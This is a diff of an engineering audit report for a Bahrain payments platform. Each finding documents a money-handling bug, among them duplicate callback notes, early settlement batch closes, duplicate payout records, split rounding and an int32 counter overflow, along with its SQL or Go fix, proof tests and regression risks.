+**What's wrong:** `applyAcquirerCallback` does an unconditional `INSERT INTO acquirer_callback_notes`; nothing checks `callback_id` and the table has no unique constraint, so every acquirer redelivery adds another identical fraud-review note.
+
+**Why it happens:** `apps/api/src/acquirer/callbacks.ts:37-50` has no `ON CONFLICT`; `db/migrations/0051_acquirer_callback_notes.sql:8-12,18` leaves `callback_id` unconstrained; `withCallbackRetry` (`callbacks.ts:62-78`) re-runs the insert on any error. The `processed_events` table that HANDOVER.md:63-64, the CHANGELOG (1.6.0, 1.9.0) and 0051:29-31 (MK "FP-238 adds a unique index here as well — done") rely on exists in no migration or code path; postmortem action #9 claims a replay test that `callbacks.test.ts` never had.
+
+**What it breaks:** Acquirer B retries a callback up to 5 times with the same callbackId when our 2xx is late. A single "confirmed_fraud" verdict can be stored 2-6 times for one payment (FP-201: "we saved two identical notes on one payment"). Inbound timestamps are not checked for freshness (CW-7: reported as hardening, not changed), so a captured signed callback could also be replayed at any time; with this fix a replay of the same `callbackId` adds no new row. Worked example from the test: 2 sequential + 3 concurrent deliveries of one callback → 5 rows.
+
+**Why it needed a fix:** FP-201 is a reopened case-file ticket for exactly this symptom ("The 1.9.0 postmortem says this was fixed. *It wasn't.*"). Duplicate verdicts confuse whoever reviews them, and any future state-changing callback built on this pattern would be applied twice (the 2026-05-14 incident class). Severity is Medium, not High: `applyAcquirerCallback` (`apps/api/src/acquirer/callbacks.ts:27-52`) only inserts an informational note and never touches `transactions.status` or the ledger, so today the duplicates are records, not money.
+
+**Fix:** new `db/migrations/0086_acquirer_callback_notes_dedupe.sql` (deletes existing duplicates keeping the earliest `(created_at, id)`, then `CREATE UNIQUE INDEX uq_acquirer_callback_notes_txn_callback ON acquirer_callback_notes (transaction_id, callback_id)`), and `apps/api/src/acquirer/callbacks.ts:40-41`:
+```diff
+-     VALUES ($1, $2, $3, $4, $5, $6, $7)`,
++     VALUES ($1, $2, $3, $4, $5, $6, $7)
++     ON CONFLICT (transaction_id, callback_id) DO NOTHING`, // CW-5: acquirer redeliveries (FP-201)
+```
+Commit: `b43c940`. Lines: prod +12/-1 (TS +2/-1, SQL +10), test +14/-0.
+
+**Why this is the smallest correct fix:** The database is the only place that is race-free (the concurrent half of the test proves a SELECT-then-INSERT check would not be). Per-transaction key matches the FP-201 symptom and stays safe if the acquirer reuses ids across transactions. The route still returns 200 on a redelivery so the acquirer stops retrying. Why not a `processed_events` table: new table + code path for the same guarantee. Why not drop `withCallbackRetry`: the insert is now idempotent, so the retry is harmless.
+
+**Proof:** `acquirer/callbacks.test.ts` "applyAcquirerCallback records a redelivered callback once (sequential and concurrent)": before `expected 1, actual 5`; after passes. `routes/acquirerCallbacks.test.ts` still green (11/11 across both files).
+
+**Regression risk:** The migration's DELETE removes historical duplicate notes (identical redeliveries; earliest kept). Unique index build takes a brief lock on a small table (CONCURRENTLY is not possible inside `db/migrate.ts`'s transaction). Covered by both callback test files.
+
+**Trap note:** The false "deduplicated" claims (CHANGELOG, HANDOVER.md:63, 0051:29-31 MK, postmortem #1/#9) are not editable here (docs/applied migration outside this lane); this note and the migration header record the correction.
+
+---
+
+<a id="f-close-1"></a>
+
+### CLOSE-1 · run-batch accepts a business day that has not ended, and a closed day is never revisited, so that day's later captures would never be paid · Severity: Medium
+**Category:** Bug
+
+**What's wrong:** `CloseBatch` (and so `RunDailyBatch`, the `run-batch` CLI, `POST /internal/run-batch`, the admin "Run batch" route and the daemon) accepted today's or a future date. It would close the batch with the volume captured so far. The money property that makes this a bug: once a day's batch is `closed` or `paid`, every later run for that day is a no-op, so any capture made later the same Bahrain day would never get a `settlement_batch_id` and would never be paid out.
+
+**Why it happens:** `apps/settlement/internal/settlement/batch.go:62` (before): CloseBatch computed `[start, end)` from `BusinessDayWindow` but never compared `end` with the current time. A batch that is already closed or paid is returned unchanged (`batch.go:97-111`, "Step 4: already closed/paid -> idempotent no-op"), so the day is never revisited. ADMIN.md:73-75 ("re-running is always safe"), RUNBOOK:44-45 and ARCHITECTURE:51-52 told operators it was safe. The admin route only checks the date's format (`routes/admin.ts:118`), not that the day has ended.
+
+**What the evidence shows (and does not):** the admin audit export has a run-batch for `"date":"2026-09-01"` at `2026-09-01T08:26:38+03:00` (`docs/exports/admin-audit-2026-09.csv:2`), i.e. an operator did request a Bahrain day that had not ended. That run closed nothing: its metadata is `"merchants":4,"alreadyClosed":4` (every merchant's batch was already closed or paid, so each call was the no-op above), and the 09-01 batches in `docs/exports/settlement-batches-2026-09-01_20.csv` carry a full day's gross (Alpha Retail 3,932,332 fils) and were paid at 2026-09-02 03:07. So the exports show no money stranded by an early close. The H5/G1 symptom (the close runs at 03:00 local, not midnight) is a different root cause, the daemon's UTC date, fixed as SCHED-1.
+
+**What it breaks:** had a day been closed early, for example by an operator running today's date before midnight, every capture after the close would stay on `merchant_payable`, never batched or paid, and nothing would report it. For a merchant at Alpha Retail's ~3,932 BD/day, a close at 08:26 would strand roughly 2,550 BD (illustrative: the remaining 15.5 hours of an even day).
+
+**Why it needed a fix:** a single early run would permanently strand that day's later captures, and merchants would be underpaid with no alert. The guard makes the property hold at the one place every entry point passes through.
+
+**Fix:** `batch.go:62-64`
+```diff
+ 	start, end := BusinessDayWindow(businessDate)
++	if time.Now().Before(end) { // CLOSE-1 (H5): never close a Bahrain business day that has not ended
++		return BatchResult{}, fmt.Errorf("settlement: CloseBatch: business day %s has not ended (Asia/Bahrain)", businessDate.Format("2006-01-02"))
++	}
+```
+Commit `56cdd1f`. Lines: prod +3/-0, test +25/-0.
+
+**Why this is the smallest correct fix:** CloseBatch is the single function every entry point funnels through, and it already has the Bahrain window end in hand. The check happens before any write, so nothing is created for an unfinished day. Why not guard only RunDailyBatch (dossier option): direct CloseBatch callers would stay open. Why not validate in server.go/main.go: there are three entry points to patch instead of one. Why not let a closed day be re-opened for late captures: that changes the batch/payout contract (a paid batch would need an adjustment batch), far beyond a guard. The HTTP layer returns its existing 500 `run_batch_failed`; mapping it to 409 is a nice-to-have in the TS/admin layer.
+
+**Proof:**
+- The guard: `TestRunDailyBatch_RefusesUnfinishedBusinessDay` (`apps/settlement/internal/settlement/close_window_audit_test.go`) failed before: `RunDailyBatch for today's (unfinished) Bahrain business day succeeded, want an error` and `1 batch(es) closed/paid for an unfinished business day, want 0`. It passes after.
+- "A closed day is never revisited": the existing `TestCloseBatch_IdempotentReClose` (`batch_test.go:197`) pins that a second CloseBatch on a closed day returns `AlreadyClosed` with the same figures and batches no new events.
+- Not proven by a test: no test inserts a capture after an early close and shows it left unbatched; that end-to-end consequence follows from the two tests above and from `batch.go:97-111`.
+- The settlement, internalapi and scheduler packages are green; every existing test closes past dates.
+
+**Regression risk:** any caller passing the current Bahrain date now gets an error. The daemon passes the previous Bahrain day once SCHED-1 is fixed; before SCHED-1, its UTC-based "yesterday" is always a day that has ended in Bahrain too, because UTC lags Bahrain. Repair for any past early close: settle captures with `settlement_batch_id IS NULL` whose day's batch is closed or paid, via an adjustment batch (ops-approved).
+
+**Trap note:** ADMIN.md, RUNBOOK and ARCHITECTURE "re-runs are always safe" are docs outside apps/settlement and are not edited here; the coordinator should correct them (see report).
+
+---
+
+<a id="f-cw-1"></a>
+
+### CW-1 · A payout disbursement record is written per webhook delivery, not per batch · Severity: Medium
+**Category:** Bug
+
+**What's wrong:** The `settlement.paid` pre-delivery effect inserts a `settlement_payout_disbursements` row (a payout-rail instruction) for every delivery row whose `attempt_count` is 0, and the table has no uniqueness on `settlement_batch_id`, so one paid batch gets one instruction per endpoint, per replay, per racing dispatcher and per duplicate outbox row.
+
+**Why it happens:** `apps/api/src/webhooks/dispatcher.ts:37-42` wires the effect; `dispatcher.ts:160-163` runs it when `attempt_count === 0`, a stale read taken by an unlocked SELECT (`:221-228`, MK "no SKIP LOCKED") and only incremented after the HTTP send; `apps/api/src/webhooks/payoutDisbursement.ts:15-16` inserts with a fresh `'disb_'||gen_random_uuid()` and no `ON CONFLICT`; `db/migrations/0057_settlement_payout_disbursements.sql:17-18` has only a non-unique index. Hidden by 0057:20 "Written inside PayoutBatch's transaction, one row per paid batch" (false: the api dispatcher writes it), `index.ts:29` ("SKIP LOCKED in the claim query", none exists), and `payoutDisbursement.test.ts:40` (FH: "only checks the insert, not who calls it or how often").
+
+**What it breaks:** Batch net payout 471,300 fils (471.300 BD), merchant with two active endpoints: two disbursement rows totalling 942,600 fils, i.e. 471.300 BD of duplicate payout instructions. The ledger has one payout leg pair, so the table and the ledger disagree by (N-1) × net.
+
+**Why Medium, not High:** the table is not a posting. Migration 0057:1-8 says it is "Not a chart-of-accounts posting" and that PayoutBatch's `merchant_payable`/`platform_cash` legs "remain the sole authoritative accounting record of a payout". Nothing reads it: the only reference in `apps/` is this INSERT (`payoutDisbursement.ts:15`); no API, report, web page or Go code selects from it, and the webhook payload does not carry its reference. So today the duplicates mislead anyone who queries the table, and would double-pay only if a future payout-rail integration acted on it. The case file's INC-2026-08-21 ("two 'your payout is on the way' messages ... two processes checked at the same time") is the duplicate notification itself, which is NOTIFY-1, not this table; only `docs/ADMIN.md:107` (an unverified doc) links the two.
+
+**Why it needed a fix:** the table is named and documented as the payout-rail instruction record ("one row per paid batch", 0057:20), and its fan-out makes it wrong by construction; a record that any future disbursement step would read must hold one row per batch.
+
+**Fix:** new `db/migrations/0087_settlement_payout_disbursements_unique_batch.sql` (removes existing duplicates keeping the earliest `(created_at, id)`; `CREATE UNIQUE INDEX uq_settlement_payout_disbursements_batch ON settlement_payout_disbursements (settlement_batch_id)`), and `apps/api/src/webhooks/payoutDisbursement.ts:16-17`:
+```diff
+-     VALUES ($1, $2, 'disb_' || gen_random_uuid())`,
++     VALUES ($1, $2, 'disb_' || gen_random_uuid())
++     ON CONFLICT (settlement_batch_id) DO NOTHING`, // CW-1: once per batch, not per webhook delivery
+```
+Commit `14db87c`. Lines: prod +12/-1 (TS +2/-1, SQL +10), test +34/-0; net with the CW-1b follow-up below: prod +9/-1.
+
+**Why this is the smallest correct fix:** The invariant is "one instruction per batch", so it belongs on the batch key in the database, which closes every fan-out path at once (multiple endpoints, replays, two replicas, restart mid-pass, duplicate `settlement.paid` outbox rows from Go). Why not only a compare-and-swap lease on the delivery row (dossier step 3): it stops racing dispatchers but not the per-endpoint/per-replay fan-out. Why not move the effect into Go `PayoutBatch`: correct long term, but a cross-lane redesign (>30 lines). The duplicate webhook *sends* from two racing dispatchers are a separate dispatcher-concurrency issue (not changed here).
+
+**Proof:** `dispatcher.test.ts` "settlement.paid to a merchant with two endpoints records one disbursement": before `{ n: '2', … }` vs expected `{ n: '1', total: '471300' }`; after passes. `payoutDisbursement.test.ts` "recordPayoutDisbursementEffect is idempotent per batch": before `expected 1, actual 3`; after passes.
+
+**Regression risk:** The migration deletes historical duplicate disbursement rows; finance should review them before production apply (the dossier's caveat). No other code reads/writes the table (grep). Covered by `payoutDisbursement.test.ts`, `dispatcher.test.ts`, `archiveReplay.test.ts` (16/16).
+
+**Trap note:** 0057:20 is an applied migration and is not edited; the 0087 header states the real writer. Not owned here: `index.ts:29,35-36` claims (SKIP LOCKED, stop() waits), `docs/ARCHITECTURE.md:50-51`, ADMIN.md:108 root cause; the Go producer half (`payout_notify.go` NOT EXISTS + INSERT, no unique outbox index) is lane D's NOTIFY-1. A merchant with no endpoint still gets no disbursement record (the effect only runs on delivery); moving it to `PayoutBatch` is recommended to lane D.
+
+**Follow-up (advisor review, commit "fix(CW-1b)"): never delete financial records.** The first version of 0087 deleted
+duplicate historic disbursement rows to make a full unique index possible. That destroys evidence finance may need when
+reviewing past payouts. 0087 (never applied outside our test databases) now creates a **partial** unique index
+`ON (settlement_batch_id) WHERE created_at >= '2026-10-30 00:00:00+03'` and deletes nothing; the insert's
+`ON CONFLICT` names the same predicate. New batches get exactly one record; historic duplicates stay for review.
+Finance cleanup item: `SELECT settlement_batch_id, count(*), sum(amount_fils) FROM settlement_payout_disbursements
+GROUP BY 1 HAVING count(*) > 1;`. Residual: a replay for a batch paid before the fix date can still add one new record
+(it is not covered by the partial index); replays of old batches are an admin action. Test:
+`payoutDisbursement.test.ts` "historic duplicate disbursement rows are kept; only new rows are unique per batch":
+before `duplicate key value violates unique constraint`, after 3 rows kept. Lines: SQL +3/−5, TS +1/−1, test +17/−0.
 
 ---
 
@@ -2509,6 +2204,56 @@ Commit: `649e4dd`. Lines: prod +6/-4 (2 code lines: the seam and the `now` line;
 **Regression risk:** after 00:15 Bahrain the daemon closes the previous Bahrain day, which CLOSE-1's guard accepts because that day has ended. The log estimate (`status.go`) is unchanged.
 
 **Trap note:** the MK and am comments in daemon.go and the "claude says" comment in window.go were replaced with the actual mechanism.
+
+---
+
+<a id="f-split-1"></a>
+
+### SPLIT-1 · Split children are rounded separately, so up to 1 fil per batch is lost or invented (a contributing cause of F3/H2, not its tens of fils) · F3, H2 · Severity: Medium
+**Category:** Bug
+
+**What's wrong:** `PayoutSplitBatch` gave each sub-merchant `ApplyRateFils(net, weightBps)` independently (banker's rounding per child). The children's shares do not sum to the batch's net payout: fils are left behind on the parent or paid twice.
+
+**Why it happens:** `apps/settlement/internal/splits/allocate.go:97` (`share := money.ApplyRateFils(money.Fils(netPayout), weightBps)`). Each child rounds on its own, and nothing hands out the difference. The TS side already has the correct largest-remainder `allocateRemainder` (packages/money/src/fils.ts:161), but the Go port never used it. `shares.go`'s `ChildShares` repeats the same per-child rounding, and its only test (`TestChildShares_SumToNet`) uses round amounts (10000 at 5000/5000, etc.) that never leave a remainder. Migration 0045 notes that the 10000-bps total is "enforced by whatever creates these rows", i.e. nothing.
+
+**What it breaks:** net 100 fils at 3333/3333/3334 bps pays 33+33+33 = 99 fils: 1 fil per batch stays on the parent's merchant_payable and never reaches any child. Net 1,001 fils at the same weights rounds to 334+334+334 = 1,002 fils, 1 fil more than the batch owes. Weights that do not total 10000 silently pay the wrong share of the batch.
+
+**How much of F3 this explains, and how much it does not:** Delta Marketplace's children are seeded at 5000/3000/2000 bps (`db/seed/fixtures/merchants.ts:186,205,224`). With those weights each child's banker's rounding (`money.ApplyRateFils` → `BankersRoundDiv`, `apps/settlement/internal/money/fils.go:15-16`) is off by at most half a fil, so the three shares together miss the net by at most **1 fil per batch, in either direction**: a net of 1 fil pays 0+0+0 (−1), a net of 3 fils pays 2+1+1 (+1). The case file's F3 describes "a few tens of fils each batch" and H2 "a few fils short". This rounding defect is a real, contributing cause of the split mismatch, but on its own it cannot produce a tens-of-fils gap, and it sometimes overpays instead of underpaying. This note does not trace the rest of F3's gap, and we do not claim this fix closes F3.
+
+**Why it needed a fix:** split payouts must pay exactly the batch's net, down to the fils (F3/H2). Every batch with a remainder either strands a fil with the parent or overpays the children by one, and the ledger drifts by that amount. Severity is Medium, not High: the error recurs on every batch with a remainder, but with the seeded weights it is bounded at 1 fil per batch.
+
+**Fix:** `allocate.go:97` + `:106-121` (+ `fmt`, `sort` imports)
+```diff
+-		share := money.ApplyRateFils(money.Fils(netPayout), weightBps)
++		share := money.Fils(netPayout * weightBps / 10_000) // floor; remainder handed out below (SPLIT-1)
+ ...
++	// SPLIT-1 (F3, H2): largest-remainder split as packages/money allocateRemainder,
++	// so the children receive exactly netPayout; the weights must total 10000 bps.
++	leftover, sumBps := money.Fils(netPayout), int64(0)
++	order := make([]int, len(shares))
++	for i, s := range shares {
++		leftover, sumBps, order[i] = leftover-s.AllocatedFils, sumBps+s.WeightBps, i
++	}
++	if sumBps != 10_000 {
++		return SplitPayoutResult{}, fmt.Errorf("splits: PayoutSplitBatch: child weights total %d bps, want 10000", sumBps)
++	}
++	sort.SliceStable(order, func(a, b int) bool {
++		return netPayout*shares[order[a]].WeightBps%10_000 > netPayout*shares[order[b]].WeightBps%10_000
++	})
++	for k := 0; leftover > 0; k++ {
++		shares[order[k]].AllocatedFils++
++		leftover--
++	}
+```
+Commit: `2b6d181`. Lines: prod +21/-1, test +66/-0.
+
+**Why this is the smallest correct fix:** it is the same algorithm as the TS `allocateRemainder` (floor each share, then give +1 fil to the largest remainders, ties by ascending index), applied in place where the shares are built and before any ledger leg is written. There is no new helper or signature change, and the posting loop is untouched. Because the weight denominator is fixed at 10000 bps, the TS decimal-scaling step is not needed. The 10000-bps check refuses a misconfigured parent instead of paying a wrong share (the transaction rolls back and nothing is paid). Why not round-to-nearest plus "dump the remainder on the last child": it is not TS-parity and is biased toward one child. Why not fix `ChildShares` in shares.go: it is not on the payout path (no production caller), so fixing it would not fix the payout. It is left as is and flagged.
+
+**Proof:** `TestPayoutSplitBatch_SharesSumToNet` (splits/allocate_audit_test.go) failed before: `child at 3334 bps got 33 fils, want 34` and `children got 99 fils in total, want the full net payout 100`. It passes after. The splits, settlement and internalapi packages are green.
+
+**Regression risk:** shares change by at most +1 fil per child, and only when a remainder exists. `totalAllocated` now equals `netPayout`, so `ApplyPayout` debits the full net (which resolves the "am: should pass netPayout here" drift note). A parent whose weights do not total 10000 bps now fails loudly instead of underpaying.
+
+**Trap note:** `TestChildShares_SumToNet` used only remainder-free amounts, so the per-child rounding was never exercised. That test and `ChildShares` are left untouched (unused in production).
 
 ---
 
@@ -2644,34 +2389,6 @@ f_k = calculateRefundFee(C, F, R_k) − Σ_{j<k} f_j, where R_k = Σ succeeded r
 
 ---
 
-<a id="f-ref-6b"></a>
-
-### REF-6b · Acquirer simulator caches transport errors, so a same-key refund retry can never succeed · FP-209, FP-300 (☐1) · Severity: Medium
-**What's wrong:** The in-process acquirer's refund idempotency cache stores every outcome, including `error`. After REF-6 made the refund's acquirer key stable across retries (correctly), a refund that hit a transient transport error replays that cached `error` (502) on every retry and can never complete.
-
-**Why it happens:** `apps/api/src/acquirer/simulator.ts:167` did `refundCache.set(req.idempotencyKey, result)` for any outcome. An `error` means the outcome is unknown (the request may not have reached the acquirer), so it must not be pinned. `approved` and `declined` are final answers and are correctly cached.
-
-**What it breaks:** 2% of refunds roll a failure by default (`ACQUIRER_FAILURE_RATE=0.02`) and 30% of those are `error`: the merchant retries with the same Idempotency-Key, as designed, and gets 502 forever, while the phase-1 reservation stays held (fail closed). No money is lost, but the refund is stuck.
-
-**Why it needed a fix:** without it REF-6's correct stable key turns every transient fault into a permanently stuck refund.
-
-**Fix:** `apps/api/src/acquirer/simulator.ts:167`
-```diff
--      refundCache.set(req.idempotencyKey, result);
-+      if (result.outcome !== "error") refundCache.set(req.idempotencyKey, result); // unknown outcome: let a same-key retry ask again
-```
-Lines: prod +1/−1, test +21/−0.
-
-**Why this is the smallest correct fix:** one condition at the cache write. Why not drop the stable key (undo REF-6)? That reopens the double-payout on retries.
-
-**Proof:** `simulator.audit.test.ts` "a refund that errored is really retried under the same idempotency key" fails before (`expected: 'approved', actual: 'error'`) and passes after; simulator 7/7, processRefund 13/13.
-
-**Regression risk:** capture and authorize caches still store `error` (same pattern); they are not retried with a stable key today, so they are left as they are and noted here.
-
-**Trap note:** the cache comment ("a client retry after a timeout gets a consistent acquirer response") is right for final outcomes and wrong for `error`.
-
----
-
 <a id="f-auth-7"></a>
 
 ### AUTH-7 · OTP resend resets the guess budget · H8 · Severity: Medium
@@ -2701,6 +2418,41 @@ Lines: prod +3/−2, test +24/−0.
 **Regression risk:** none for honest users (5 guesses per login, as designed). Admin OTP resend, if added later, needs the same line.
 
 **Trap note:** the docstring (`:191-194`) described intended behaviour as if it were implemented. It is now true. `auth/sessions.ts:114-115` ("FH: OTP brute force through resend?" dismissed by "MK: 5/14 was webhooks") had already spotted it.
+
+---
+
+<a id="f-vol-1"></a>
+
+### VOL-1 · Platform volume counter `total_processed_fils` is INTEGER / int32, against ADR-0001's BIGINT rule, and silently wraps negative · ADR-0001 · Severity: Medium
+**Category:** Bug
+
+**What's wrong:** `platform_stats.total_processed_fils`, the lifetime gross fils settled through `CloseBatch`, is an `INTEGER` column, and the Go accumulator reads, adds and compares it as `int32`. ADR-0001 rule 1 says every monetary value is integer fils and "Columns end in `_fils` and are `BIGINT`"; rule 2 says Go uses `money.Fils` (`int64`). This column and its Go code break both rules.
+
+**Why it happens:**
+- `db/migrations/0049_platform_stats.sql:7` declares `INTEGER` (max 2,147,483,647 fils = 2,147,483.647 BD).
+- `apps/settlement/internal/settlement/platform_volume.go` (before the fix) used `int32` for the read, the write and the threshold, and `updated := current + int32(batchGrossFils)` wraps silently in Go. A negative int32 is a valid INTEGER, so Postgres stores it without an error.
+- Yousif's handover line says "`platform_stats.total_processed_fils` is INTEGER, which is fine while it's only a counter" (`docs/HANDOVER.md:40-41`). We follow ADR-0001 over that remark. The ADR is the platform-wide money rule and names no exception for counters, the column is a fils amount by name and content, and even a pure counter must not wrap into a negative fils figure.
+- Hiding cover: 0049:13-16 ("INTEGER is plenty for a counter" / "INTEGER in PostgreSQL is 64-bit on 64-bit builds", which is false: it is always 4 bytes); `apps/api/src/fees/platformVolumeTier.ts:6-7` ("total_processed_fils is BIGINT ... Claude double-checked the migration", also false); the Go test file carried `MK: no test above the threshold, or near int32 max. TODO`.
+
+**What it breaks:** a counter at 2,140,000,000 fils plus a 20,000,123 fils batch should be 2,160,000,123 fils. In int32 it wraps to −2,134,967,173, and that value is stored. At the September run-rate in `docs/exports/settlement-batches-2026-09-01_20.csv` (592,982.202 BD gross over 20 business days, about 29,649 BD/day) a counter starting at zero reaches the int32 limit in about 72 days. From then on the platform's lifetime volume figure is negative and meaningless. Its only production reader is the capture-time volume-tier lookup (`platformVolumeTier.ts:25-28`, called from `capture.ts:169`); since FEES-5, settlement no longer prices off it. That tier is itself unapproved (FEES-1, reported, not changed), so this note does not rest on the tier's pricing. While the tier code stays live, though, the wrap would also switch its discount off platform-wide.
+
+**Why it needed a fix:** ADR-0001 makes BIGINT/int64 the type for every fils value, so a wrapping money counter is a defect whether or not anything prices off it. Severity is Medium, not High: the counter is reachable at real volume and fails silently, but its pricing consequence depends on the unapproved tier (FEES-1).
+
+**Fix:** `db/migrations/0082_platform_stats_bigint.sql` (new):
+```sql
+ALTER TABLE platform_stats ALTER COLUMN total_processed_fils TYPE BIGINT;
+```
+`platform_volume.go`: `int32` → `int64` in the three signatures, the scan variable, the threshold constant and the addition (`current + batchGrossFils`, no truncating cast). `batch.go` needs no change, because the type flows from the return value. `platformVolumeTier.ts` needs no change either: pg returns int8 as a string, and `"2160000123" >= 2000000000` compares numerically in JS (proved by the TS audit test).
+
+Lines: prod +9/-6 (migration +3 new file: 1 statement + 2 comment lines; platform_volume.go +6/-6). Tests: +57 Go, +21 TS (new files).
+
+**Why this is the smallest correct fix:** it changes the column type and the Go type, the two places that break ADR-0001, and nothing else. Alternatives rejected: (a) widening only the column keeps the int32 wrap in Go; (b) widening only Go fails with "integer out of range" at the DB; (c) a `SET x = x + $2` rewrite or a clamp changes the contract and still overflows the column. No backfill: the test DB counter is not negative. If production's has already wrapped, it must be recomputed from closed batches (an ops note, not code).
+
+**Proof:** before the fix: `platform_volume_audit_test.go:39: total_processed_fils = -2134967173, want 2160000123 (2140000000 + 20000123)`. After: `TestAuditVOL1_PlatformCounterPastInt32Max` passes (it also checks that 3,000,000,000 round-trips); `platformVolumeTier.audit.test.ts` passes (before 0082, the INT4 column rejects 3,000,000,000 with "integer out of range"). The full `internal/settlement` package is green. Commit `43e737e`.
+
+**Regression risk:** Low. `ALTER ... TYPE BIGINT` rewrites a one-row table. The existing `TestRecordPlatformProcessedVolume_SmallValuesExact` (which scans into int32) still passes.
+
+**Trap note:** the two comments claiming the column is BIGINT, or that INTEGER is "64-bit on 64-bit builds", are the cover; the migration is the truth. Yousif's "fine while it's only a counter" is an honest judgement call, but ADR-0001 governs it.
 
 ---
 
@@ -2788,34 +2540,10 @@ Lines: prod +9/-3 (code +7/-1, comments +2/-2), test +31/-0.
 
 ---
 
-<a id="f-led-1"></a>
-
-### LED-1 · The ledger can be edited and deleted as long as each group still balances · F2 · Severity: Medium
-**What's wrong:** `ledger_entries` accepts UPDATE and DELETE. Nothing stops someone from rewriting history: scaling a whole posting ×10, back-dating it, or deleting it.
-
-**Why it happens:** `db/migrations/0007_ledger_double_entry.sql:38-70` installs one deferred trigger that only checks that each entry group still nets to 0. Its comment (`:72-74`) claims "Immutability: ... an edited or removed leg unbalances its group ... No separate reject trigger or REVOKE is needed". That is true for one leg, false for a whole group: multiply both legs by 10, or delete both, and the group still balances, so the commit succeeds.
-
-**What it breaks:** the ledger is the source of truth that BAL-1, reconciliation and the payout netting rely on. F2 (the March sweep "ran twice ... the gap doubled", with "the log file only has one timestamp") is the kind of problem an append-only ledger turns from silent to impossible. Worked example (from the test): a balanced 1,000-fil group rewritten to 10,000 fils committed without error.
-
-**Why it needed a fix:** a financial ledger whose rows can be rewritten cannot prove anything to finance or auditors.
-
-**Fix:** new migration `db/migrations/0084_ledger_entries_append_only.sql`: a `BEFORE UPDATE OR DELETE ... FOR EACH ROW` trigger that raises "ledger_entries is append-only: post a compensating entry instead". Lines: SQL +11 (6 code, 5 comment/blank), test +44.
-
-**Why this is the smallest correct fix:** one trigger at the table, independent of every caller. No application code or test updates or deletes ledger rows (repo-wide grep), and TRUNCATE (dev seed) is not a row operation. Why not REVOKE UPDATE/DELETE: every service connects as the table owner (single DB role in compose), and owners bypass grants.
-
-**Proof:** `scripts/ledger_append_only.audit.test.ts` "ledger entries are append-only: balanced edits and deletes are rejected": before `Missing expected rejection: UPDATE ledger_entries SET amount_fils = amount_fils * 10 ...`; after both statements are rejected (run in rolled-back savepoints).
-
-**Regression risk:** the only writer that updated ledger rows was the FP-300 demo's labelled "DEMO-ONLY" back-dating step (`ops/demo.sh`), which now disables and re-enables this trigger around that one statement, in plain sight. Fixing a wrong posting now requires a compensating group, which is the documented accounting rule.
-
-**Trap note:** the "Immutability" comment in 0007 (`:72-74`) is false for whole-group edits. 0007 is an applied migration, so the comment is left in place and corrected here.
-
-**Runtime verification (advisor check, 2026-10-30):** repo-wide grep finds no UPDATE or DELETE on `ledger_entries` in TS, Go, scripts or migrations ≥ 0084 (RecalculateMDR posts compensating INSERTs, `recalculate_mdr.go:167-189`). On the compose stack with 0084 applied, the real flows ran with **0 append-only rejections** in the api, settlement and reporting logs: `settlement run-batch` (close + pay, refund netting), `settlement rebuild-balances` (all merchants), `/internal/recalculate-mdr` (200), `scripts/reconcile_march.ts` (sweep inserts), the FP-300 refund flow, and the full `ops/demo.sh`. The demo's box-3 time travel no longer touches the ledger: it backdates only the settlement inputs that CloseBatch selects (`transaction_events.occurred_at`, `refunds.occurred_at`, `batch.go:152-158, 225-226`), so the trigger is never disabled. Fresh compose database (77 migrations, seed, demo): 32 PASS / 0 FAIL.
-
----
-
 <a id="f-fees-5"></a>
 
 ### FEES-5 · Settlement re-prices each capture with its own formula, so the batch fee drifts from the ledger and strands fils in merchant_payable · FP-300 ☐3 · Severity: Medium
+**Category:** Bug
 
 **What's wrong:** `CloseBatch` did not use the fee the ledger booked at capture. It re-priced every capture event itself with `ComputeSettlementFee`, which takes the discount off the amount before applying the MDR. Capture books the MDR first and then takes the discount off the fee. For a discounted merchant the two answers differ by ±1 fil per event. `PayoutBatch` then debits `merchant_payable` by Go's net, so the gap stays in `merchant_payable` for good.
 
@@ -2823,7 +2551,7 @@ Lines: prod +9/-3 (code +7/-1, comments +2/-2), test +31/-0.
 
 **What it breaks:** 602 fils at 275 bps with a 1250 bps discount: the ledger books 17 − 2 = 15 and the batch charges 14, so the payout is 588 and `merchant_payable` ends at −1 after payout. For 12,345 fils at 250 bps with 1500 bps the ledger books 263 and the batch 262. Each discounted event can drift by one fil, which matches "the gap is never 0 for discounted merchants". Re-pricing at close also means a tier flip, or a schedule tie-break (FEES-1/FEES-8), between capture and close prices the batch differently from the ledger.
 
-**Why it needed a fix:** Case file ☐3, "Fees and payouts come out right", and "money is right in the ledger, down to the fils". User decision 2026-10-30 (option A): one fee per capture, booked once in the ledger at capture, fee-first, and everything downstream uses the booked fee. Go must charge what the ledger charged.
+**Why it needed a fix:** Case file FP-300 ☐3, "Fees and payouts come out right", and ☐2, "money is right in the ledger, down to the fils". The defect is the **parity** break: settlement charged a different fee from the one the ledger booked, and the difference stayed in `merchant_payable`. That is a bug whichever formula order is right. Which order is right was genuinely ambiguous in the repo (the sources conflict, see the trap note), so we did not pick it ourselves. The user's decision of 2026-10-30 (option A, recorded in `5542c53` and merge `fb739e7`) settled it: one fee per capture, booked once in the ledger at capture, fee-first, and everything downstream uses the booked fee. Go must charge what the ledger charged.
 
 **Fix:** `apps/settlement/internal/settlement/batch.go:51,142-144,163-164,169,189,204`; `discounted_fee.go:8-9`
 ```diff
@@ -2860,8 +2588,8 @@ The fee-schedule load, the tier bonus and the per-event re-pricing are deleted b
 
 **RecalculateMDR:** this function re-prices unpaid (`closed`) batches at the merchant's *current* terms on purpose. Feeding it the booked fee would make it a no-op, so it keeps `ComputeSettlementFee`. Once `CloseBatch` charges the booked fee, though, the amount-first formula would make it post a −1 adjustment at *unchanged* terms (602/275/1250: booked 15, recomputed 14). The 2-line formula change to fee-first makes it agree with capture. Known limitation, unchanged by this fix: RecalculateMDR uses `merchants.mdr_bps` with no fee schedule and no tier (FEES-2/MDR-1 territory).
 
-**Why this is the smallest correct fix:** One subquery reads the figure the ledger already holds, and one line charges it. Settlement now has no fee formula of its own to drift. The rejected alternatives:
-- *Option B only*, i.e. the fee-first formula in `ComputeSettlementFee` (2 lines). That aligns the rounding but still re-prices at close, so tier and schedule-timing differences (FEES-1/FEES-8) and any future capture-side change drift again. It is also not the user's decision.
+**Why this is the smallest correct fix:** One subquery reads the figure the ledger already holds, and one line charges it. Settlement now has no fee formula of its own to drift: the ledger is the single source of truth for the fee, and the batch reads it instead of recomputing it. The rejected alternatives:
